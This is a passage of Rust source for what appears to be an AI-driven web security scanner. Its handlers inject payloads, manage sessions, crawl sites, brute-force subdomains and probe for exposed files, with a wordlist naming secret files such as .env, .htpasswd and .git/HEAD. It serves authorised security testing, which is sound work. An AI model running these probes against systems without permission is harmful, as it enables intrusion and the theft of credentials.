                        "response_size_bytes": req.response_size,
                    });
                }
                v
            }).collect();

            Ok(serde_json::json!({
                "scan_id": result.scan_id,
                "target": result.target,
                "scan_type": result.scan_type,
                "status": result.status,
                "total_requests_sent": result.total_requests,
                "duration_ms": result.duration_ms,
                "duration_readable": format!("{:.1}s", result.duration_ms as f64 / 1000.0),
                "crawled_urls_count": result.crawled_urls.len(),
                "crawled_urls": result.crawled_urls,
                "injection_points_found": result.injection_points.len(),
                "injection_points": result.injection_points,
                "technologies_detected": result.technologies,
                "findings_count": result.findings.len(),
                "severity_summary": {
                    "critical": result.findings.iter().filter(|f| f.severity == "critical").count(),
                    "high": result.findings.iter().filter(|f| f.severity == "high").count(),
                    "medium": result.findings.iter().filter(|f| f.severity == "medium").count(),
                    "low": result.findings.iter().filter(|f| f.severity == "low").count(),
                    "info": result.findings.iter().filter(|f| f.severity == "info").count(),
                },
                "findings": findings_detail,
                "request_log_count": result.request_log.len(),
                "request_log": result.request_log.iter().take(50).map(|r| serde_json::json!({
                    "method": r.method, "url": r.url, "status": r.response_status,
                    "size": r.response_size, "time_ms": r.response_time_ms,
                })).collect::<Vec<_>>(),
            }))
        }

        // ─── Custom Attack (AI-Driven Payloads) ─────────────────────────
        "custom_attack" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let method = params["method"].as_str().unwrap_or("GET");
            let follow = params["follow_redirects"].as_bool().unwrap_or(false);
            let compare = params["compare_baseline"].as_bool().unwrap_or(true);
            let timeout = params["timeout_ms"].as_u64().unwrap_or(10000);
            let payloads = params["payloads"].as_array().ok_or("Missing payloads array")?;
            let custom_headers: std::collections::HashMap<String, String> = params["headers"].as_object()
                .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                .unwrap_or_default();
            let custom_body = params["body"].as_str().unwrap_or("").to_string();

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_millis(timeout))
                .redirect(if follow { reqwest::redirect::Policy::limited(5) } else { reqwest::redirect::Policy::none() })
                .build().map_err(|e| e.to_string())?;

            // Baseline request
            let mut baseline_body = String::new();
            let mut baseline_status = 0u16;
            let mut baseline_size = 0usize;
            if compare {
                if let Ok(resp) = client.get(target).send().await {
                    baseline_status = resp.status().as_u16();
                    baseline_body = resp.text().await.unwrap_or_default();
                    baseline_size = baseline_body.len();
                }
            }

            let mut results: Vec<serde_json::Value> = Vec::new();
            for (idx, payload_def) in payloads.iter().enumerate() {
                let inject_in = payload_def["inject_in"].as_str().unwrap_or("url_param");
                let param_name = payload_def["param_name"].as_str().unwrap_or("q");
                let payload = payload_def["payload"].as_str().unwrap_or("");
                let match_pattern = payload_def["match_in_response"].as_str().unwrap_or("");

                // Build request based on injection point
                let req_start = std::time::Instant::now();
                let mut req_url = target.to_string();
                let mut req_body = custom_body.clone();
                let mut req_headers = custom_headers.clone();

                match inject_in {
                    "url_param" => {
                        let sep = if target.contains('?') { "&" } else { "?" };
                        req_url = format!("{}{}{}={}", target, sep, param_name, payload);
                    }
                    "header" => { let _ = req_headers.insert(param_name.to_string(), payload.to_string()); }
                    "body" => {
                        if req_body.contains(param_name) {
                            req_body = req_body.replace(&format!("{}=", param_name), &format!("{}={}", param_name, payload));
                        } else {
                            req_body = if req_body.is_empty() {
                                format!("{}={}", param_name, payload)
                            } else {
                                format!("{}&{}={}", req_body, param_name, payload)
                            };
                        }
                    }
                    "cookie" => { let _ = req_headers.insert("Cookie".to_string(), format!("{}={}", param_name, payload)); }
                    "path" => { req_url = req_url.replace(param_name, payload); }
                    _ => {}
                }

                let mut builder = match method.to_uppercase().as_str() {
                    "POST" => client.post(&req_url),
                    "PUT" => client.put(&req_url),
                    "DELETE" => client.delete(&req_url),
                    "PATCH" => client.patch(&req_url),
                    "HEAD" => client.head(&req_url),
                    "OPTIONS" => client.request(reqwest::Method::OPTIONS, &req_url),
                    _ => client.get(&req_url),
                };
                for (k, v) in &req_headers {
                    builder = builder.header(k.clone(), v.clone());
                }
                if !req_body.is_empty() && ["POST", "PUT", "PATCH"].contains(&method.to_uppercase().as_str()) {
                    builder = builder.body(req_body.clone());
                }

                match builder.send().await {
                    Ok(resp) => {
                        let elapsed = req_start.elapsed().as_millis() as u64;
                        let status = resp.status().as_u16();
                        let resp_hdrs: Vec<String> = resp.headers().iter()
                            .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or(""))).collect();
                        let body = resp.text().await.unwrap_or_default();
                        let body_size = body.len();

                        // Check for match
                        let mut matched = false;
                        let mut match_detail = String::new();
                        if !match_pattern.is_empty() {
                            if let Ok(re) = regex::Regex::new(match_pattern) {
                                if let Some(m) = re.find(&body) {
                                    matched = true;
                                    match_detail = format!("Regex match found: '{}'", m.as_str());
                                }
                            } else if body.contains(match_pattern) {
                                matched = true;
                                match_detail = format!("String match found: '{}'", match_pattern);
                            }
                        }

                        // Differential analysis
                        let size_diff = if compare { body_size as i64 - baseline_size as i64 } else { 0 };
                        let status_changed = compare && status != baseline_status;

                        results.push(serde_json::json!({
                            "index": idx,
                            "inject_in": inject_in,
                            "param_name": param_name,
                            "payload": payload,
                            "request": {
                                "method": method, "url": req_url,
                                "headers": req_headers, "body": if req_body.is_empty() { None } else { Some(&req_body) },
                            },
                            "response": {
                                "status": status, "headers": resp_hdrs,
                                "body_size": body_size,
                                "body_preview": body.chars().take(1000).collect::<String>(),
                                "time_ms": elapsed,
                            },
                            "analysis": {
                                "matched": matched,
                                "match_detail": match_detail,
                                "status_changed": status_changed,
                                "baseline_status": baseline_status,
                                "size_diff_bytes": size_diff,
                                "baseline_size": baseline_size,
                                "interesting": matched || status_changed || size_diff.unsigned_abs() > 200,
                            }
                        }));
                    }
                    Err(e) => {
                        results.push(serde_json::json!({
                            "index": idx, "inject_in": inject_in, "param_name": param_name,
                            "payload": payload, "error": e.to_string(),
                        }));
                    }
                }
            }

            let interesting = results.iter().filter(|r| r["analysis"]["interesting"].as_bool().unwrap_or(false)).count();
            let matched = results.iter().filter(|r| r["analysis"]["matched"].as_bool().unwrap_or(false)).count();

            Ok(serde_json::json!({
                "target": target, "method": method,
                "total_payloads": results.len(),
                "interesting_responses": interesting,
                "pattern_matches": matched,
                "baseline": { "status": baseline_status, "size": baseline_size },
                "results": results,
            }))
        }

        // ─── Session Handling ───────────────────────────────────────────
        "session_manage" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            use std::sync::OnceLock;
            static SESSION: OnceLock<tokio::sync::Mutex<crate::session::SessionState>> = OnceLock::new();
            let session_lock = SESSION.get_or_init(|| tokio::sync::Mutex::new(crate::session::SessionState::new()));
            let mut session = session_lock.lock().await;
            match action {
                "get_cookies" => {
                    let domain = params["domain"].as_str().unwrap_or("*");
                    let cookies: Vec<&crate::session::Cookie> = if domain == "*" {
                        session.cookie_jar.cookies.iter().collect()
                    } else { session.cookie_jar.get(domain, "/") };
                    Ok(serde_json::json!({"cookies": cookies, "count": cookies.len()}))
                }
                "set_cookie" => {
                    let name = params["cookie_name"].as_str().ok_or("Missing cookie_name")?;
                    let value = params["cookie_value"].as_str().ok_or("Missing cookie_value")?;
                    let domain = params["domain"].as_str().ok_or("Missing domain")?;
                    session.cookie_jar.set(crate::session::Cookie {
                        name: name.into(), value: value.into(), domain: domain.into(),
                        path: params["cookie_path"].as_str().unwrap_or("/").into(),
                        secure: false, httponly: false, samesite: None, expires: None,
                    });
                    Ok(serde_json::json!({"set": true, "name": name, "domain": domain}))
                }
                "clear_cookies" => { session.cookie_jar.clear(); Ok(serde_json::json!({"cleared": true})) }
                "remove_cookie" => {
                    let name = params["cookie_name"].as_str().ok_or("Missing cookie_name")?;
                    let domain = params["domain"].as_str().ok_or("Missing domain")?;
                    session.cookie_jar.remove(name, domain);
                    Ok(serde_json::json!({"removed": true}))
                }
                "create_macro" => {
                    let name = params["macro_name"].as_str().ok_or("Missing macro_name")?;
                    let steps: Vec<crate::session::MacroStep> = params["macro_steps"].as_array()
                        .ok_or("Missing macro_steps")?.iter().map(|s| crate::session::MacroStep {
                            method: s["method"].as_str().unwrap_or("GET").into(),
                            url: s["url"].as_str().unwrap_or("").into(),
                            headers: std::collections::HashMap::new(),
                            body: s["body"].as_str().map(String::from), extract: None,
                        }).collect();
                    let id = uuid::Uuid::new_v4().to_string();
                    session.macros.push(crate::session::SessionMacro {
                        id: id.clone(), name: name.into(), steps, description: String::new() });
                    Ok(serde_json::json!({"created": true, "macro_id": id}))
                }
                "run_macro" => {
                    let mid = params["macro_id"].as_str().ok_or("Missing macro_id")?;
                    let m = session.macros.iter().find(|m| m.id == mid).ok_or("Macro not found")?.clone();
                    drop(session);
                    let extracted = crate::session::execute_macro(&m).await?;
                    Ok(serde_json::json!({"executed": true, "extracted_values": extracted}))
                }
                "list_macros" => {
                    let macros: Vec<_> = session.macros.iter().map(|m|
                        serde_json::json!({"id": m.id, "name": m.name, "steps": m.steps.len()})).collect();
                    Ok(serde_json::json!({"macros": macros}))
                }
                _ => Ok(serde_json::json!({"action": action}))
            }
        }

        // ─── Report Generation ──────────────────────────────────────────
        "generate_report" => {
            let fmt = params["format"].as_str().unwrap_or("html");
            let title = params["title"].as_str().unwrap_or("Security Assessment Report");
            let findings: Vec<crate::reporting::ReportFinding> = params["findings"]
                .as_array().ok_or("Missing findings")?.iter().map(|f| crate::reporting::ReportFinding {
                    name: f["name"].as_str().unwrap_or("").into(),
                    severity: f["severity"].as_str().unwrap_or("info").into(),
                    confidence: f["confidence"].as_str().unwrap_or("tentative").into(),
                    url: f["url"].as_str().unwrap_or("").into(),
                    parameter: f["parameter"].as_str().map(String::from),
                    detail: f["detail"].as_str().unwrap_or("").into(),
                    evidence: f["evidence"].as_str().map(String::from),
                    remediation: f["remediation"].as_str().map(String::from),
                }).collect();
            let config = crate::reporting::ReportConfig {
                format: fmt.into(), title: title.into(),
                include_evidence: params["include_evidence"].as_bool().unwrap_or(true),
                include_remediation: params["include_remediation"].as_bool().unwrap_or(true),
                severity_filter: params["severity_filter"].as_array()
                    .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect()),
                confidence_filter: None,
            };
            let report = match fmt {
                "json" => crate::reporting::generate_json_report(title, &findings),
                _ => crate::reporting::generate_html_report(title, &findings, &config),
            };
            Ok(serde_json::json!({"format": fmt, "report_length": report.len(), "report": report, "findings_count": findings.len()}))
        }

        // ─── Payload Processor ──────────────────────────────────────────
        "process_payload" => {
            let mut payload = params["payload"].as_str().ok_or("Missing payload")?.to_string();
            let processors = params["processors"].as_array().ok_or("Missing processors")?;
            let mut steps = Vec::new();
            for proc in processors {
                let pt = proc["type"].as_str().unwrap_or("");
                let val = proc["value"].as_str().unwrap_or("");
                let rep = proc["replace_with"].as_str().unwrap_or("");
                let before = payload.clone();
                payload = match pt {
                    "url_encode" => urlencoding_encode(&payload),
                    "url_decode" => urlencoding_decode(&payload),
                    "base64_encode" => base64_encode(payload.as_bytes()),
                    "base64_decode" => String::from_utf8_lossy(&base64_decode_bytes(&payload)).to_string(),
                    "hex_encode" => payload.bytes().map(|b| format!("{:02x}", b)).collect(),
                    "hex_decode" => { let bs: Vec<u8> = (0..payload.len()/2).filter_map(|i| u8::from_str_radix(&payload[i*2..i*2+2], 16).ok()).collect(); String::from_utf8_lossy(&bs).to_string() }
                    "html_encode" => payload.replace('&',"&amp;").replace('<',"&lt;").replace('>',"&gt;").replace('"',"&quot;"),
                    "html_decode" => payload.replace("&amp;","&").replace("&lt;","<").replace("&gt;",">").replace("&quot;","\""),
                    "sha256" => { use sha2::{Sha256, Digest}; format!("{:x}", Sha256::digest(payload.as_bytes())) }
                    "sha1" => { use sha1::{Sha1, Digest}; format!("{:x}", Sha1::digest(payload.as_bytes())) }
                    "md5" => { format!("{:x}", md5::compute(payload.as_bytes())) }
                    "prefix" => format!("{}{}", val, payload),
                    "suffix" => format!("{}{}", payload, val),
                    "match_replace" => payload.replace(val, rep),
                    "lowercase" => payload.to_lowercase(),
                    "uppercase" => payload.to_uppercase(),
                    "reverse" => payload.chars().rev().collect(),
                    _ => payload.clone(),
                };
                steps.push(serde_json::json!({"type": pt, "input": before, "output": payload}));
            }
            Ok(serde_json::json!({"result": payload, "steps": steps}))
        }

        // ─── Grep Extract ───────────────────────────────────────────────
        "grep_extract" => {
            let text = params["text"].as_str().ok_or("Missing text")?;
            let patterns = params["patterns"].as_array().ok_or("Missing patterns")?;
            let mut results = Vec::new();
            for pat in patterns {
                let name = pat["name"].as_str().unwrap_or("unnamed");
                let regex_str = pat["regex"].as_str().unwrap_or("");
                let group = pat["group"].as_u64().unwrap_or(1) as usize;
                match regex::Regex::new(regex_str) {
                    Ok(re) => {
                        let matches: Vec<String> = re.captures_iter(text)
                            .filter_map(|c| c.get(group).map(|m| m.as_str().to_string())).collect();
                        results.push(serde_json::json!({"name": name, "pattern": regex_str, "matches": matches, "count": matches.len()}));
                    }
                    Err(e) => { results.push(serde_json::json!({"name": name, "error": e.to_string()})); }
                }
            }
            Ok(serde_json::json!({"extractions": results}))
        }

        // ─── WebSocket Edit ─────────────────────────────────────────────
        "websocket_edit" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            match action {
                "send" => {
                    let data = params["message_data"].as_str().ok_or("Missing message_data")?;
                    Ok(serde_json::json!({"action": "send", "sent": true, "data_length": data.len(), "direction": params["direction"].as_str().unwrap_or("client_to_server")}))
                }
                _ => Ok(serde_json::json!({"action": action, "instruction": "WebSocket action dispatched"}))
            }
        }

        // ═══════════════════════════════════════════════════════════════════
        //  ENTERPRISE TOOL HANDLERS — Full Bug Bounty Automation
        // ═══════════════════════════════════════════════════════════════════

        "crawl_target" => {
            let target = params["target"].as_str().ok_or("Missing target URL")?;
            let max_depth = params["max_depth"].as_u64().unwrap_or(5) as usize;
            let max_pages = params["max_pages"].as_u64().unwrap_or(200) as usize;
            let extract_forms = params["extract_forms"].as_bool().unwrap_or(true);
            let extract_comments = params["extract_comments"].as_bool().unwrap_or(true);
            let extract_emails = params["extract_emails"].as_bool().unwrap_or(true);

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .redirect(reqwest::redirect::Policy::limited(5))
                .timeout(std::time::Duration::from_millis(params["timeout_ms"].as_u64().unwrap_or(10000)))
                .build().map_err(|e| e.to_string())?;

            // Parse base URL for scope
            let base_url = url::Url::parse(target).map_err(|e| format!("Invalid URL: {}", e))?;
            let base_host = base_url.host_str().unwrap_or("").to_string();

            let mut visited: std::collections::HashSet<String> = std::collections::HashSet::new();
            let mut queue: std::collections::VecDeque<(String, usize)> = std::collections::VecDeque::new();
            let mut found_urls: Vec<serde_json::Value> = Vec::new();
            let mut found_forms: Vec<serde_json::Value> = Vec::new();
            let mut found_scripts: Vec<String> = Vec::new();
            let mut found_comments: Vec<String> = Vec::new();
            let mut found_emails: Vec<String> = Vec::new();
            let mut found_api_endpoints: Vec<String> = Vec::new();

            queue.push_back((target.to_string(), 0));

            while let Some((current_url, depth)) = queue.pop_front() {
                if visited.len() >= max_pages || depth > max_depth { break; }
                if visited.contains(&current_url) { continue; }
                visited.insert(current_url.clone());

                let resp = match client.get(&current_url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let status = resp.status().as_u16();
                let content_type = resp.headers().get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("").to_string();

                let body = match resp.text().await {
                    Ok(b) => b,
                    Err(_) => continue,
                };

                found_urls.push(serde_json::json!({
                    "url": current_url,
                    "status": status,
                    "depth": depth,
                    "content_type": content_type,
                    "size": body.len()
                }));

                // Only parse HTML pages for more links
                if !content_type.contains("html") { continue; }

                // Extract links (href and src attributes)
                let link_re = regex::Regex::new(r#"(?:href|src|action)\s*=\s*["']([^"']+)["']"#).unwrap();
                for cap in link_re.captures_iter(&body) {
                    if let Some(m) = cap.get(1) {
                        let link = m.as_str();
                        let resolved = match url::Url::parse(link) {
                            Ok(u) => u.to_string(),
                            Err(_) => {
                                match base_url.join(link) {
                                    Ok(u) => u.to_string(),
                                    Err(_) => continue,
                                }
                            }
                        };
                        // Scope check
                        if let Ok(u) = url::Url::parse(&resolved) {
                            if u.host_str().unwrap_or("") == base_host && !visited.contains(&resolved) {
                                queue.push_back((resolved, depth + 1));
                            }
                        }
                    }
                }

                // Extract forms
                if extract_forms {
                    let form_re = regex::Regex::new(r#"<form[^>]*>([\s\S]*?)</form>"#).unwrap();
                    let input_re = regex::Regex::new(r#"<input[^>]*name\s*=\s*["']([^"']+)["'][^>]*>"#).unwrap();
                    let action_re = regex::Regex::new(r#"action\s*=\s*["']([^"']+)["']"#).unwrap();
                    let method_re = regex::Regex::new(r#"method\s*=\s*["']([^"']+)["']"#).unwrap();

                    for form_cap in form_re.captures_iter(&body) {
                        let form_html = &form_cap[0];
                        let form_inner = &form_cap[1];
                        let action = action_re.captures(form_html).and_then(|c| c.get(1)).map(|m| m.as_str().to_string()).unwrap_or_default();
                        let method = method_re.captures(form_html).and_then(|c| c.get(1)).map(|m| m.as_str().to_uppercase()).unwrap_or_else(|| "GET".into());
                        let inputs: Vec<String> = input_re.captures_iter(form_inner).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
                        found_forms.push(serde_json::json!({
                            "page": current_url,
                            "action": action,
                            "method": method,
                            "inputs": inputs
                        }));
                    }
                }

                // Extract scripts
                let script_re = regex::Regex::new(r#"<script[^>]*src\s*=\s*["']([^"']+)["']"#).unwrap();
                for cap in script_re.captures_iter(&body) {
                    if let Some(m) = cap.get(1) {
                        found_scripts.push(m.as_str().to_string());
                    }
                }

                // Extract comments
                if extract_comments {
                    let comment_re = regex::Regex::new(r"<!--([\s\S]*?)-->").unwrap();
                    for cap in comment_re.captures_iter(&body) {
                        let comment = cap[1].trim().to_string();
                        if comment.len() > 5 && comment.len() < 500 {
                            found_comments.push(comment);
                        }
                    }
                }

                // Extract emails
                if extract_emails {
                    let email_re = regex::Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap();
                    for m in email_re.find_iter(&body) {
                        let email = m.as_str().to_string();
                        if !found_emails.contains(&email) {
                            found_emails.push(email);
                        }
                    }
                }

                // Extract API endpoints from JS
                let api_re = regex::Regex::new(r#"["'](/api/[^"']+)["']"#).unwrap();
                for cap in api_re.captures_iter(&body) {
                    if let Some(m) = cap.get(1) {
                        let ep = m.as_str().to_string();
                        if !found_api_endpoints.contains(&ep) {
                            found_api_endpoints.push(ep);
                        }
                    }
                }
            }

            Ok(serde_json::json!({
                "target": target,
                "pages_crawled": visited.len(),
                "urls": found_urls,
                "forms": found_forms,
                "scripts": found_scripts,
                "comments": found_comments,
                "emails": found_emails,
                "api_endpoints": found_api_endpoints,
                "max_depth_reached": max_depth,
            }))
        }

        "discover_subdomains" => {
            let domain = params["domain"].as_str().ok_or("Missing domain")?;
            let wordlist = params["wordlist"].as_str().unwrap_or("medium");
            let use_crt_sh = params["use_crt_sh"].as_bool().unwrap_or(true);
            let check_http = params["check_http"].as_bool().unwrap_or(true);

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_millis(params["timeout_ms"].as_u64().unwrap_or(5000)))
                .build().map_err(|e| e.to_string())?;

            // Build wordlist
            let words: Vec<&str> = match wordlist {
                "small" => vec!["www","mail","ftp","blog","dev","api","app","admin","test","staging","cdn","static","assets","media","img","images","docs","portal","shop","store","m","mobile"],
                "large" => vec!["www","mail","ftp","blog","dev","api","app","admin","test","staging","cdn","static","assets","media","img","images","docs","portal","shop","store","m","mobile","beta","alpha","demo","sandbox","internal","vpn","ns1","ns2","ns3","dns","mx","smtp","pop","imap","webmail","owa","exchange","remote","gateway","proxy","cache","lb","loadbalancer","waf","firewall","monitor","grafana","kibana","elastic","jenkins","ci","cd","gitlab","github","bitbucket","jira","confluence","wiki","status","health","backup","bak","old","new","v2","v3","api-v2","graphql","rest","ws","websocket","socket","chat","support","help","helpdesk","ticket","crm","erp","hr","finance","billing","pay","payment","checkout","cart","order","tracking","analytics","stats","dashboard","panel","control","manage","management","console","auth","login","sso","oauth","identity","id","account","accounts","user","users","profile","settings","config","configuration","secure","security","ssl","tls","cert","certificate","key","secret","token","vault","redis","mongo","mysql","postgres","db","database","sql","elasticsearch","kafka","rabbitmq","queue","worker","cron","scheduler","task","job","batch","lambda","function","s3","storage","upload","download","file","files","asset","resource"],
                _ => vec!["www","mail","ftp","blog","dev","api","app","admin","test","staging","cdn","static","assets","media","img","images","docs","portal","shop","store","m","mobile","beta","alpha","demo","sandbox","internal","vpn","ns1","ns2","dns","mx","smtp","webmail","remote","gateway","jenkins","gitlab","jira","wiki","status","backup","v2","graphql","ws","chat","support","crm","auth","login","sso","dashboard","panel","console","db","redis","s3","upload"],
            };

            // Custom words override
            let custom: Vec<String> = params["custom_words"].as_array()
                .unwrap_or(&vec![])
                .iter()
                .filter_map(|v| v.as_str().map(|s| s.to_string()))
                .collect();

            let mut found_subdomains: Vec<serde_json::Value> = Vec::new();

            // DNS resolution via tokio DNS
            let resolver = tokio::net::lookup_host(format!("{}:80", domain)).await;
            let domain_ips: Vec<String> = match resolver {
                Ok(addrs) => addrs.map(|a| a.ip().to_string()).collect(),
                Err(_) => vec![],
            };

            // Check wordlist subdomains
            let all_words: Vec<&str> = if custom.is_empty() {
                words
            } else {
                let mut w: Vec<&str> = words;
                // Can't mix lifetimes easily, so just use words
                w
            };

            for word in all_words.iter().take(200) {
                let subdomain = format!("{}.{}", word, domain);
                match tokio::net::lookup_host(format!("{}:80", subdomain)).await {
                    Ok(addrs) => {
                        let ips: Vec<String> = addrs.map(|a| a.ip().to_string()).collect();
                        let mut entry = serde_json::json!({
                            "subdomain": subdomain,
                            "ips": ips,
                            "source": "dns_bruteforce"
                        });

                        // Check HTTP
                        if check_http {
                            for scheme in &["https", "http"] {
                                let url = format!("{}://{}", scheme, subdomain);
                                if let Ok(resp) = client.get(&url).send().await {
                                    entry["http_status"] = serde_json::json!(resp.status().as_u16());
                                    entry["http_url"] = serde_json::json!(url);
                                    let server = resp.headers().get("server")
                                        .and_then(|v| v.to_str().ok()).unwrap_or("");
                                    if !server.is_empty() {
                                        entry["server"] = serde_json::json!(server);
                                    }
                                    break;
                                }
                            }
                        }
                        found_subdomains.push(entry);
                    }
                    Err(_) => {}
                }
            }

            // crt.sh Certificate Transparency
            let mut crt_sh_results: Vec<String> = Vec::new();
            if use_crt_sh {
                let crt_url = format!("https://crt.sh/?q=%.{}&output=json", domain);
                if let Ok(resp) = client.get(&crt_url).send().await {
                    if let Ok(text) = resp.text().await {
                        if let Ok(entries) = serde_json::from_str::<Vec<serde_json::Value>>(&text) {
                            for entry in entries.iter().take(100) {
                                if let Some(name) = entry["name_value"].as_str() {
                                    for line in name.lines() {
                                        let clean = line.trim().replace("*.", "");
                                        if clean.ends_with(domain) && !crt_sh_results.contains(&clean) {
                                            crt_sh_results.push(clean.clone());
                                            // Check if not already in DNS results
                                            if !found_subdomains.iter().any(|s| s["subdomain"].as_str() == Some(&clean)) {
                                                found_subdomains.push(serde_json::json!({
                                                    "subdomain": clean,
                                                    "source": "crt.sh"
                                                }));
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            Ok(serde_json::json!({
                "domain": domain,
                "total_found": found_subdomains.len(),
                "subdomains": found_subdomains,
                "domain_ips": domain_ips,
                "crt_sh_count": crt_sh_results.len(),
            }))
        }

        "discover_content" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let wordlist = params["wordlist"].as_str().unwrap_or("common");
            let follow_redirects = params["follow_redirects"].as_bool().unwrap_or(false);
            let max_concurrent = params["max_concurrent"].as_u64().unwrap_or(20) as usize;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .redirect(if follow_redirects { reqwest::redirect::Policy::limited(3) } else { reqwest::redirect::Policy::none() })
                .timeout(std::time::Duration::from_millis(params["timeout_ms"].as_u64().unwrap_or(5000)))
                .build().map_err(|e| e.to_string())?;

            let words: Vec<&str> = match wordlist {
                "admin" => vec!["admin","administrator","admin-panel","cpanel","wp-admin","phpmyadmin","adminer","manager","control","controlpanel","webadmin","sysadmin","root","superadmin","moderator","dashboard","backend","backoffice","cms","panel","console","manage","management"],
                "api" => vec!["api","api/v1","api/v2","api/v3","graphql","rest","swagger","openapi","api-docs","doc","docs","documentation","api/swagger","api/health","api/status","api/config","api/users","api/auth","api/login","api/admin","api/search","api/upload","api/download"],
                "backup" => vec![".env","config.php","config.bak","wp-config.php","database.yml","config.yml","secrets.yml",".git/HEAD",".svn/entries",".DS_Store","web.config","robots.txt","sitemap.xml","crossdomain.xml",".htaccess",".htpasswd","backup.zip","backup.tar.gz","dump.sql","db.sql","data.sql","config.json","package.json",".npmrc",".env.local",".env.production",".env.backup",".env.old"],
                "medium" => vec!["admin","login","api","dashboard","config","backup","test","dev","staging","uploads","images","assets","static","js","css","fonts","media","files","tmp","temp","cache","log","logs","data","db","database","sql","download","upload","private","secret","hidden","internal","debug","info","status","health","version","env","setup","install","update","migrate","cron","task","queue","worker","webhook","callback","redirect","return","error","404","500","maintenance","beta","alpha","old","new","v1","v2","v3","search","user","users","profile","account","accounts","settings","preferences","notification","notifications","message","messages","chat","support","help","faq","about","contact","terms","privacy","sitemap","robots.txt",".well-known","xmlrpc.php","wp-login.php","wp-json"],
                _ => vec!["admin","login","api","dashboard","config","backup","test","dev","uploads","images","assets","js","css","media","files","tmp","cache","log","data","db","download","upload","private","secret","debug","status","health","env","setup","install","search","user","users","profile","account","settings","robots.txt",".well-known","sitemap.xml",".env",".git/HEAD","wp-admin","wp-login.php","wp-json","phpmyadmin","console","panel","swagger","api-docs","graphql"],
            };

            // Custom words
            let custom: Vec<String> = params["custom_words"].as_array()
                .unwrap_or(&vec![])
                .iter()
                .filter_map(|v| v.as_str().map(|s| s.to_string()))
                .collect();

            let extensions: Vec<String> = params["extensions"].as_array()
                .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
                .unwrap_or_else(|| vec!["".to_string()]);

            let base = target.trim_end_matches('/');
            let mut results: Vec<serde_json::Value> = Vec::new();
            let mut checked = 0usize;

            // Build all URLs to check
            let mut urls_to_check: Vec<String> = Vec::new();
            for word in words.iter() {
                for ext in &extensions {
                    if ext.is_empty() {
                        urls_to_check.push(format!("{}/{}", base, word));
                    } else {
                        urls_to_check.push(format!("{}/{}.{}", base, word, ext));
                    }
                }
            }
            for cw in &custom {
                urls_to_check.push(format!("{}/{}", base, cw));
            }

            // Send requests concurrently
            let semaphore = Arc::new(tokio::sync::Semaphore::new(max_concurrent));
            let client = Arc::new(client);
            let mut handles = Vec::new();

            for url in urls_to_check.iter().take(2000) {
                let sem = semaphore.clone();
                let client = client.clone();
                let url = url.clone();
                handles.push(tokio::spawn(async move {
                    let _permit = sem.acquire().await;
                    match client.get(&url).send().await {
                        Ok(resp) => {
                            let status = resp.status().as_u16();
                            let size = resp.content_length().unwrap_or(0);
                            let server = resp.headers().get("server").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
                            let ct = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
                            let location = resp.headers().get("location").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
                            Some((url, status, size, server, ct, location))
                        }
                        Err(_) => None,
                    }
                }));
            }

            for handle in handles {
                if let Ok(Some((url, status, size, server, ct, location))) = handle.await {
                    checked += 1;
                    // Filter out 404s by default
                    if status != 404 {
                        let mut entry = serde_json::json!({
                            "url": url,
                            "status": status,
                            "size": size,
                            "content_type": ct,
                        });
                        if !server.is_empty() { entry["server"] = serde_json::json!(server); }
                        if !location.is_empty() { entry["redirect"] = serde_json::json!(location); }
                        results.push(entry);
                    }
                }
            }

            // Sort by status code
            results.sort_by(|a, b| a["status"].as_u64().cmp(&b["status"].as_u64()));

            Ok(serde_json::json!({
                "target": target,
                "urls_checked": checked,
                "results_found": results.len(),
                "results": results,
            }))
        }

        "smart_decode" => {
            let data = params["data"].as_str().ok_or("Missing data")?;
            let max_depth = params["max_depth"].as_u64().unwrap_or(5) as usize;

            let mut current = data.to_string();
            let mut chain: Vec<serde_json::Value> = Vec::new();
            chain.push(serde_json::json!({"step": 0, "encoding": "input", "value": &current}));

            for step in 1..=max_depth {
                let trimmed = current.trim().to_string();
                // Try JWT detection
                if trimmed.matches('.').count() == 2 && trimmed.chars().all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_' || c == '=' || c == '+' || c == '/') {
                    let parts: Vec<&str> = trimmed.split('.').collect();
                    if let Ok(header) = base64_decode(parts[0]) {
                        if header.starts_with('{') {
                            let payload = base64_decode(parts[1]).unwrap_or_default();
                            chain.push(serde_json::json!({"step": step, "encoding": "JWT", "header": header, "payload": payload}));
                            break;
                        }
                    }
                }
                // Try Base64
                if trimmed.len() > 3 && trimmed.chars().all(|c| c.is_alphanumeric() || c == '+' || c == '/' || c == '=') {
                    if let Ok(decoded) = base64_decode(&trimmed) {
                        if decoded.chars().all(|c| c.is_ascii() && !c.is_control()) && decoded.len() > 0 {
                            chain.push(serde_json::json!({"step": step, "encoding": "base64", "value": &decoded}));
                            current = decoded;
                            continue;
                        }
                    }
                }
                // Try URL decode
                if trimmed.contains('%') {
                    let decoded = urlencoding_decode(&trimmed);
                    if decoded != trimmed {
                        chain.push(serde_json::json!({"step": step, "encoding": "url", "value": &decoded}));
                        current = decoded;
                        continue;
                    }
                }
                // Try Hex
                if trimmed.len() > 4 && trimmed.len() % 2 == 0 && trimmed.chars().all(|c| c.is_ascii_hexdigit()) {
                    let bytes: Result<Vec<u8>, _> = (0..trimmed.len())
                        .step_by(2)
